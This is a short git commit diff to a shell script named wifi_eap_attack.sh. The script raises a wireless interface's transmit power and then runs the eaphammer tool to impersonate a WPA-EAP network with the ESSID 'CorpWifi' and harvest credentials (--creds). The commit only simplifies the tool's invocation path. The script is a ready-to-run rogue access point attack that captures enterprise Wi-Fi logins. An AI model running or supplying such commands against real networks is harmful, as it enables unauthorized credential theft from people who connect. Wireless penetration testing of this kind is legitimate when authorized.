848a4d609f2d92d39c2c3a4f5ac12fc99b124408
sirchsec <85844648+sirchsec@users.noreply.github.com>
2021-10-12 10:50:16 -0400

    Update wifi_eap_attack.sh

--- wifi_eap_attack.sh
+++ wifi_eap_attack.sh
@@ -18,5 +18,4 @@ sudo iw $interface set txpower fixed 3000
 sudo iw dev $interface set type managed
 sudo ip link set $interface up
 
-cd /opt/eaphammer
-/opt/eaphammer/eaphammer -i $interface --channel 4 --auth wpa-eap --essid CorpWifi --creds
+eaphammer -i $interface --channel 4 --auth wpa-eap --essid CorpWifi --creds
